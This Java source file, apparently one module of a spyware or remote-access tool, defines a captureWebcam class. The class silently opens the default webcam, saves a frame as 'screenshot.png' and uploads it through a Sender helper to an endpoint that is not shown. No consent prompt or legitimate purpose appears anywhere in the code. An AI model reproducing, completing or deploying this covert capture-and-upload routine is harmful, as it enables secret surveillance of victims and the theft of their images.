package io.github.luxotick.impl;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.util.ImageUtils;
import io.github.luxotick.Sender;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;

public class captureWebcam {
    public static void capture() throws IOException {
        OkHttpClient client = new OkHttpClient();

        Webcam webcam = Webcam.getDefault();
        webcam.open();

        BufferedImage image = webcam.getImage();
        File file = new File("screenshot.png");
        try {
            ImageIO.write(image, "PNG", file);

            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", file.getName(), RequestBody.create(okhttp3.MediaType.parse("image/png"), file))
                    .build();

            Sender.sendFile(new OkHttpClient(), requestBody);
        } catch (IOException e) {
            System.out.println("Error while capturing webcam.");
            e.printStackTrace();
        }
    }
}
